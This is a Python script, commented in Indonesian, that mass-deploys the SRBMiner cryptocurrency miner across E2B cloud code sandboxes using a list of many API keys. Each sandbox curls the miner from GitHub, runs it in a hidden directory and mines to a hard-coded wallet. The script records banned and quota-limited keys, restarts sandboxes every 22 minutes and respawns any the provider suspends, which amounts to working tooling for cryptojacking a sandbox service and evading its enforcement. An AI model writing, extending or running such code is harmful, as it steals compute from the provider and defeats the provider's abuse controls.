import os
import sys
import time
import json
import signal
import argparse
import requests
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# Pastikan console stdout mendukung UTF-8 di Windows dan unbuffered
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace", line_buffering=True)
        sys.stderr.reconfigure(encoding="utf-8", errors="replace", line_buffering=True)
    except Exception:
        pass

# Cek import E2B SDK
try:
    from e2b import Sandbox, Template
except ImportError:
    print("[ERROR] E2B SDK belum terinstall! Silakan install: pip install e2b requests")
    sys.exit(1)

# Default Fallback Config (SRBMiner-MULTI MinotaurX)
DEFAULT_CONFIG = {
    "mode": "srbminer",
    "template_name": "base",
    "slots_per_key": 20,
    "cpu_count": 8,
    "workers_count": 8,
    "memory_mb": 8192,
    "sandbox_timeout_seconds": 1800, # 30 menit max timeout E2B
    "duration_minutes": 22,          # Rerun otomatis setiap 22 menit
    "auto_respawn": True,
    "algorithm": "minotaurx",
    "host": "minotaurx.sea.mine.zpool.ca",
    "port": 7019,
    "worker_wallet": "DPmJiSA9ZDRsphrFhTamUVf7TNakGtBzjM",
    "password": "c=DGB",
    "keys_file": "list.txt",
    "concurrency_limit": 3,
    "spawn_delay_seconds": 1.0
}

CONFIG_FILE = "config_zpool.json" if os.path.exists("config_zpool.json") else "config.json"

def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8-sig") as f:
                data = json.load(f)
                merged = DEFAULT_CONFIG.copy()
                merged.update(data)
                return merged
        except Exception as e:
            print(f"[!] Gagal membaca {CONFIG_FILE}: {e}. Menggunakan default.")
    return DEFAULT_CONFIG.copy()

def save_config(cfg):
    try:
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump(cfg, f, indent=2)
    except Exception as e:
        print(f"[!] Gagal menyimpan {CONFIG_FILE}: {e}")

# Global State Tracker
is_running = True
active_sandboxes = {} # worker_key -> info dict
banned_keys = set()
quota_keys = set()
lock = threading.Lock()

SYS_DIR = "/var/tmp/.srb_runner"
LOG_FILE = "/tmp/srbminer.log"
SRB_DOWNLOAD_URL = "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.6.5/SRBMiner-Multi-3-6-5-Linux.tar.gz"

def build_srbminer_bash_script(cfg, worker_label):
    algo = cfg.get("algorithm", "minotaurx")
    host = cfg.get("host", "minotaurx.sea.mine.zpool.ca")
    port = cfg.get("port", 7019)
    wallet = cfg.get("worker_wallet", "DPmJiSA9ZDRsphrFhTamUVf7TNakGtBzjM")
    password = cfg.get("password", "c=DGB")
    threads = cfg.get("workers_count", 8)

    pool_address = f"stratum+tcp://{host}:{port}"

    return f"""#!/bin/bash
mkdir -p {SYS_DIR}
cd {SYS_DIR} || exit 1

if [ ! -f SRBMiner-MULTI ]; then
    echo "[{worker_label}] Downloading SRBMiner-MULTI v3.6.5..."
    curl -sL "{SRB_DOWNLOAD_URL}" -o srb.tar.gz
    tar -xzf srb.tar.gz --strip-components=1
    rm -f srb.tar.gz
fi

echo "[{worker_label}] Starting SRBMiner-MULTI ({algo})..."
./SRBMiner-MULTI \\
    --disable-gpu \\
    --algorithm {algo} \\
    --pool {pool_address} \\
    --wallet {wallet} \\
    --password {password},id={worker_label} \\
    --cpu-threads {threads}
"""

def get_remote_active_sandboxes(api_key):
    try:
        headers = {"X-API-Key": api_key, "Accept": "application/json"}
        resp = requests.get("https://api.e2b.dev/sandboxes", headers=headers, timeout=10)
        if resp.status_code in (401, 403):
            with lock:
                banned_keys.add(api_key)
            return None
        if resp.status_code == 200:
            data = resp.json()
            sandboxes = data if isinstance(data, list) else data.get("sandboxes", data.get("data", []))
            active_ids = set()
            for s in sandboxes:
                s_id = s.get("sandboxID") or s.get("sandboxId") or s.get("id")
                state = str(s.get("status") or s.get("state") or "").lower()
                if s_id and state not in ("suspended", "paused", "closed", "stopped", "dead"):
                    active_ids.add(s_id)
            return active_ids
    except Exception:
        pass
    return None

def ensure_template_exists(api_key, template_name="base", cpu_count=8, memory_mb=8192, label="E2B"):
    if not template_name or template_name.lower() == "base":
        return "base"
    
    try:
        if Template.exists(template_name, api_key=api_key):
            print(f"[{label}] ✅ Template '{template_name}' siap di akun ini.")
            return template_name
        
        print(f"[{label}] 📦 Template '{template_name}' belum ada. Fallback ke 'base'...")
        return "base"
    except Exception as e:
        print(f"[{label}] ⚠️ Info build template '{template_name}': {e}. Menggunakan 'base'.")
        return "base"

def clean_remote_orphan_sandboxes(api_key, label="E2B"):
    try:
        headers = {"X-API-Key": api_key, "Accept": "application/json"}
        resp = requests.get("https://api.e2b.dev/sandboxes", headers=headers, timeout=10)
        if resp.status_code in (401, 403):
            print(f"[{label}] 🚫 Akun/Team BANNED/INVALID (HTTP {resp.status_code}).")
            with lock:
                banned_keys.add(api_key)
            return
        if resp.status_code == 200:
            data = resp.json()
            sandboxes = data if isinstance(data, list) else data.get("sandboxes", data.get("data", []))
            if sandboxes:
                print(f"[{label}] 🧹 Ditemukan {len(sandboxes)} sandbox aktif. Membersihkan...")
                def delete_one(s):
                    s_id = s.get("sandboxID") or s.get("sandboxId") or s.get("id")
                    if s_id:
                        try:
                            requests.delete(f"https://api.e2b.dev/sandboxes/{s_id}", headers=headers, timeout=5)
                        except Exception:
                            pass
                with ThreadPoolExecutor(max_workers=20) as ex:
                    list(ex.map(delete_one, sandboxes))
                time.sleep(1)
                print(f"[{label}] ✅ Cloud sandbox bersih.")
    except Exception:
        pass

def parse_keys_file(filepath):
    if not os.path.exists(filepath):
        return []
    
    accounts = []
    with open(filepath, "r", encoding="utf-8-sig") as f:
        for line_no, raw_line in enumerate(f, 1):
            line = raw_line.strip()
            if not line or line.startswith("#"):
                continue
            
            label = f"key-{line_no}"
            token = ""

            if "|" in line:
                parts = [p.strip() for p in line.split("|")]
                found_token = None
                for part in parts:
                    if part.startswith("e2b_"):
                        found_token = part
                        break
                
                if found_token:
                    token = found_token
                    label = parts[0] if parts[0] != token else f"user-{line_no}"
                else:
                    if len(parts) >= 2:
                        label = parts[0]
                        token = parts[1]
                    else:
                        token = parts[0]
            else:
                token = line.strip()

            if token:
                accounts.append({
                    "index": line_no,
                    "label": label,
                    "token": token
                })
    return accounts

def spawn_single_sandbox(cfg, account, slot_index):
    token = account["token"]
    label = account["label"]
    worker_name = f"{label.replace(' ', '_')}-srb-slot-{slot_index}"
    worker_key = f"{token[:12]}-{slot_index}"
    timeout_sec = cfg.get("sandbox_timeout_seconds", 1800)
    template_name = account.get("ready_template") or cfg.get("template_name", "base")
    
    cpu_cnt = cfg.get("cpu_count", 8)
    mem_mb = cfg.get("memory_mb", 8192)

    if token in banned_keys:
        return {"status": "banned", "worker_name": worker_name, "error": "Team is banned"}
    if token in quota_keys:
        return {"status": "quota_limit", "worker_name": worker_name, "error": "Quota limit reached"}

    print(f"    🚀 [{label}] Memulai Sandbox Slot #{slot_index} ({worker_name}) [{cpu_cnt} vCPU / {mem_mb}MB RAM | Tpl: {template_name}]...")
    sbx = None

    try:
        try:
            # Mengalokasikan CPU & RAM secara eksplisit ke SDK E2B
            sbx = Sandbox.create(
                template=template_name,
                api_key=token,
                timeout=timeout_sec,
                request_timeout=180,
                cpu_count=cpu_cnt,
                memory_mb=mem_mb,
                envs={
                    "WORKER_NAME": worker_name,
                    "BOT_LABEL": worker_name,
                }
            )
        except Exception as tpl_err:
            if "not found" in str(tpl_err).lower() and template_name != "base":
                print(f"      ⚠️ Template '{template_name}' tidak ditemukan, fallback ke 'base'...")
                sbx = Sandbox.create(
                    template="base",
                    api_key=token,
                    timeout=timeout_sec,
                    request_timeout=180,
                    cpu_count=cpu_cnt,
                    memory_mb=mem_mb,
                    envs={
                        "WORKER_NAME": worker_name,
                        "BOT_LABEL": worker_name,
                    }
                )
            else:
                raise tpl_err

        sandbox_id = sbx.sandbox_id
        print(f"      ✅ Sandbox ID [{sandbox_id}] Berhasil Dibuat!")

        # 1. Tulis script bash runner ke container
        bash_content = build_srbminer_bash_script(cfg, worker_name)
        sbx.commands.run(f"mkdir -p {SYS_DIR}", timeout=30, request_timeout=30)
        sbx.files.write(f"{SYS_DIR}/run_miner.sh", bash_content)
        sbx.commands.run(f"chmod +x {SYS_DIR}/run_miner.sh", timeout=30, request_timeout=30)

        # 2. Install curl & tar jika belum ada
        setup_cmd = (
            "[ -f /usr/bin/curl ] && [ -f /usr/bin/tar ] || ("
            "sudo apt-get update -qq && "
            "sudo apt-get install -y -qq curl tar procps || true)"
        )
        sbx.commands.run(setup_cmd, timeout=120, request_timeout=120)

        # 3. Eksekusi SRBMiner di background
        cmd_str = f"(nohup {SYS_DIR}/run_miner.sh </dev/null >{LOG_FILE} 2>&1 &)"
        sbx.commands.run(cmd_str, timeout=30, request_timeout=30)

        now = datetime.now()
        expires_at = now + timedelta(seconds=timeout_sec)

        info = {
            "worker_name": worker_name,
            "sandbox_id": sandbox_id,
            "token": token,
            "label": label,
            "slot_index": slot_index,
            "created_at": now,
            "expires_at": expires_at,
            "sbx_obj": sbx,
            "status": "RUNNING"
        }

        with lock:
            active_sandboxes[worker_key] = info

        print(f"      🔥 [ACTIVE] {worker_name} SRBMiner Running!\n")
        return {"status": "success", "info": info}

    except Exception as e:
        err_msg = str(e)
        print(f"      ❌ Gagal spawn {worker_name}: {err_msg}")

        if sbx:
            try: sbx.kill()
            except Exception: pass

        if "banned" in err_msg.lower() or "403" in err_msg or "unauthorized" in err_msg.lower():
            print(f"      🚫 Akun/Team {label} BANNED/INVALID.")
            with lock:
                banned_keys.add(token)
            return {"status": "banned", "worker_name": worker_name, "error": err_msg}

        if "limit" in err_msg.lower() or "quota" in err_msg.lower() or "rate" in err_msg.lower() or "429" in err_msg:
            print(f"      ⚠️ Kuota/Rate Limit tercapai untuk {label}.")
            with lock:
                quota_keys.add(token)
            return {"status": "quota_limit", "worker_name": worker_name, "error": err_msg}

        return {"status": "error", "worker_name": worker_name, "error": err_msg}

def deploy_all(cfg, accounts):
    slots = cfg.get("slots_per_key", 20)
    concurrency = cfg.get("concurrency_limit", 20)
    template_target = cfg.get("template_name", "base")

    def prepare_account(acc):
        if acc["token"] not in banned_keys:
            clean_remote_orphan_sandboxes(acc["token"], acc["label"])
            tpl = ensure_template_exists(acc["token"], template_target, cfg.get("cpu_count", 8), cfg.get("memory_mb", 8192), acc["label"])
            acc["ready_template"] = tpl
        return acc

    with ThreadPoolExecutor(max_workers=max(1, len(accounts))) as ex:
        accounts = list(ex.map(prepare_account, accounts))

    tasks = []
    for acc in accounts:
        token = acc["token"]
        if token in banned_keys:
            continue
        for slot in range(1, slots + 1):
            tasks.append((acc, slot))

    if not tasks:
        print("\n=======================================================")
        print("⚠️ Tidak ada sandbox yang dapat dideploy.")
        print("=======================================================\n")
        return []

    spawn_delay = cfg.get("spawn_delay_seconds", 1.0)
    print("\n=======================================================")
    print(f"📦 Total Target Sandbox : {len(tasks)} ({len(accounts)} Akun x {slots} Slots/Akun)")
    print(f"⚡ Mode Mining           : SRBMiner-MULTI v3.6.5 ({cfg.get('algorithm', 'minotaurx')})")
    print(f"⚡ Resource per Sandbox : {cfg.get('cpu_count', 8)} vCPU | {cfg.get('memory_mb', 8192)} MB RAM")
    print(f"⏱️ Auto-Rerun Interval  : Setiap {cfg.get('duration_minutes', 22)} Menit")
    print("=======================================================\n")

    results = []
    with ThreadPoolExecutor(max_workers=concurrency) as executor:
        futures = []
        for acc, slot in tasks:
            fut = executor.submit(spawn_single_sandbox, cfg, acc, slot)
            futures.append(fut)
            if spawn_delay > 0:
                time.sleep(spawn_delay)

        for fut in as_completed(futures):
            res = fut.result()
            results.append(res)

    success_count = sum(1 for r in results if r["status"] == "success")
    print("\n=======================================================")
    print(f"📊 Ringkasan Deploy: {success_count}/{len(tasks)} SRBMiner Sandbox Berhasil Aktif!")
    print("=======================================================\n")
    return results

def monitor_and_respawn_loop(cfg, accounts):
    global is_running
    slots = cfg.get("slots_per_key", 20)
    check_interval = 20
    start_time = datetime.now()
    target_duration_sec = cfg.get("duration_minutes", 22) * 60
    keys_file = cfg.get("keys_file", "list.txt")

    known_tokens = {acc["token"] for acc in accounts}

    print("🔄 Mode Auto-Respawn Daemon AKTIF. Memonitor Sandbox 24/7...")
    print(f"⏱️ Limit Duration    : Rerun otomatis pada {target_duration_sec // 60} menit")
    print("🛡️ Suspend Detection  : Real-time API check")
    print("📂 Dynamic Key Reload : ACTIVE (Bisa nambah key di list.txt tanpa restart!)")
    print("Tekan Ctrl + C untuk keluar kapan saja.\n")

    while is_running:
        try:
            now = datetime.now()
            uptime_str = str(now - start_time).split(".")[0]

            # --- 1. DYNAMIC HOT-RELOAD KEY DETECTION ---
            latest_accounts = parse_keys_file(keys_file)
            new_accounts = [acc for acc in latest_accounts if acc["token"] not in known_tokens]

            if new_accounts:
                print(f"\n✨ [HOT-RELOAD] Ditemukan {len(new_accounts)} key baru di '{keys_file}'!")
                
                def prepare_acc(acc):
                    if acc["token"] not in banned_keys:
                        clean_remote_orphan_sandboxes(acc["token"], acc["label"])
                        tpl = ensure_template_exists(
                            acc["token"], 
                            cfg.get("template_name", "base"), 
                            cfg.get("cpu_count", 8), 
                            cfg.get("memory_mb", 8192), 
                            acc["label"]
                        )
                        acc["ready_template"] = tpl
                    return acc

                with ThreadPoolExecutor(max_workers=max(1, len(new_accounts))) as ex:
                    new_accounts = list(ex.map(prepare_acc, new_accounts))

                new_tasks = []
                for acc in new_accounts:
                    if acc["token"] not in banned_keys:
                        for slot in range(1, slots + 1):
                            new_tasks.append((acc, slot))

                if new_tasks:
                    concurrency = cfg.get("concurrency_limit", 3)
                    spawn_delay = cfg.get("spawn_delay_seconds", 1.0)
                    print(f"🚀 Memulai deploy {len(new_tasks)} slot untuk key baru...")

                    with ThreadPoolExecutor(max_workers=concurrency) as executor:
                        futures = []
                        for acc, slot in new_tasks:
                            fut = executor.submit(spawn_single_sandbox, cfg, acc, slot)
                            futures.append(fut)
                            if spawn_delay > 0:
                                time.sleep(spawn_delay)
                        for fut in as_completed(futures):
                            pass

                for acc in new_accounts:
                    accounts.append(acc)
                    known_tokens.add(acc["token"])

                print(f"✅ Hot-reload selesai. Total key aktif dipantau: {len(accounts)}\n")

            # --- 2. CHECK REMOTE SUSPENDED / DEAD STATUS ---
            remote_active_by_token = {}
            for acc in accounts:
                token = acc["token"]
                if token not in banned_keys:
                    remote_ids = get_remote_active_sandboxes(token)
                    if remote_ids is not None:
                        remote_active_by_token[token] = remote_ids

            to_respawn = []
            with lock:
                for acc in accounts:
                    token = acc["token"]
                    if token in banned_keys:
                        continue
                    
                    for slot in range(1, slots + 1):
                        worker_key = f"{token[:12]}-{slot}"
                        if worker_key not in active_sandboxes:
                            to_respawn.append((acc, slot))
                        else:
                            info = active_sandboxes[worker_key]
                            elapsed_sec = (now - info["created_at"]).total_seconds()
                            sbx_id = info["sandbox_id"]

                            # Deteksi Suspended
                            is_suspended = False
                            if token in remote_active_by_token:
                                if sbx_id not in remote_active_by_token[token]:
                                    is_suspended = True

                            if is_suspended:
                                print(f"⚠️ Sandbox {info['worker_name']} [{sbx_id[:8]}] TERDETEKSI SUSPENDED/DEAD! Me-respawn...")
                                try:
                                    info["sbx_obj"].kill()
                                except Exception:
                                    pass
                                del active_sandboxes[worker_key]
                                to_respawn.append((acc, slot))
                                continue

                            # Deteksi Timeout Rerun (22m)
                            if elapsed_sec >= target_duration_sec:
                                print(f"⏰ Sandbox {info['worker_name']} menyentuh {int(elapsed_sec//60)}m. Me-rerun...")
                                try:
                                    info["sbx_obj"].kill()
                                except Exception:
                                    pass
                                del active_sandboxes[worker_key]
                                to_respawn.append((acc, slot))

            # --- 3. RESPAWN SLOT YANG KOSONG / EXPIRED ---
            if to_respawn:
                print(f"✨ Menjalankan respawn untuk {len(to_respawn)} slot...")
                with lock:
                    quota_keys.clear()
                for acc, slot in to_respawn:
                    if not is_running:
                        break
                    spawn_single_sandbox(cfg, acc, slot)
                    time.sleep(0.5)

            with lock:
                active_count = len(active_sandboxes)
                banned_count = len(banned_keys)

            print(f"[{now.strftime('%H:%M:%S')}] 🟢 Status: {active_count} SRBMiner Sandbox Aktif | ⏱️ Uptime: {uptime_str} | 🚫 Banned Key: {banned_count}")
            
            for _ in range(check_interval):
                if not is_running:
                    break
                time.sleep(1)

        except Exception as e:
            print(f"⚠️ Error pada monitor loop: {e}")
            time.sleep(5)

def signal_handler(sig, frame):
    global is_running
    print("\n\n🛑 Menerima sinyal STOP (Ctrl+C)... Menghentikan Deployer.")
    is_running = False

def main():
    signal.signal(signal.SIGINT, signal_handler)
    if hasattr(signal, "SIGTERM"):
        signal.signal(signal.SIGTERM, signal_handler)

    parser = argparse.ArgumentParser(description="E2B ZPool SRBMiner Cloud Sandbox Auto-Deployer")
    parser.add_argument("--template", "-tmpl", default=None, help="Nama template E2B")
    parser.add_argument("--file", "-f", default=None, help="File path E2B API Key")
    parser.add_argument("--slots", "-s", type=int, default=None, help="Jumlah sandbox per API Key")
    parser.add_argument("--duration", "-d", type=int, default=None, help="Durasi rerun dalam menit (default: 22)")
    parser.add_argument("--wallet", "-w", default=None, help="Wallet ZPool / DGB")
    parser.add_argument("--workers", type=int, default=None, help="Jumlah worker threads per sandbox")
    parser.add_argument("--once", action="store_true", help="Jalankan sekali tanpa monitor loop")
    parser.add_argument("--daemon", action="store_true", help="Paksa jalankan daemon auto-respawn 24/7")

    args = parser.parse_args()
    cfg = load_config()

    if args.template:
        cfg["template_name"] = args.template
    if args.slots:
        cfg["slots_per_key"] = args.slots
    if args.duration:
        cfg["duration_minutes"] = args.duration
    if args.wallet:
        cfg["worker_wallet"] = args.wallet
    if args.workers:
        cfg["workers_count"] = args.workers
    if args.file:
        cfg["keys_file"] = args.file

    keys_file = cfg.get("keys_file", "list.txt")
    template_name = cfg.get("template_name", "base")

    print(f"""
=============================================================
  ⚡ E2B ZPOOL SRBMINER V3.6.5 DEPLOYER
  🔥 {cfg.get('cpu_count', 8)} vCPU | {cfg.get('memory_mb', 8192)} MB RAM | {cfg.get('algorithm', 'minotaurx')}
  🛡️ Rerun Interval: {cfg.get('duration_minutes', 22)} Menit
=============================================================
""")
    print("⚙️  Konfigurasi:")
    print(f"   • Template E2B         : {template_name}")
    print(f"   • File Key             : {keys_file}")
    print(f"   • Slots per Key        : {cfg['slots_per_key']} Slots")
    print(f"   • Rerun Duration       : {cfg.get('duration_minutes', 22)} menit")
    print(f"   • Auto-Respawn Loop    : {'ON (24/7 Keepalive)' if (cfg['auto_respawn'] or args.daemon) and not args.once else 'OFF'}")
    print("=============================================================\n")

    accounts = parse_keys_file(keys_file)
    if not accounts:
        print(f"❌ Error: File '{keys_file}' tidak ditemukan atau kosong!")
        sys.exit(1)

    print(f"📋 Ditemukan {len(accounts)} API Key di '{keys_file}':")
    for acc in accounts:
        print(f"   [{acc['index']}] {acc['label']} ({acc['token'][:10]}...{acc['token'][-4:]})")

    deploy_all(cfg, accounts)

    if (cfg.get("auto_respawn", True) or args.daemon) and not args.once:
        monitor_and_respawn_loop(cfg, accounts)
    else:
        print("✅ Deploy selesai. Program ditutup (One-Shot mode).")

if __name__ == "__main__":
    main()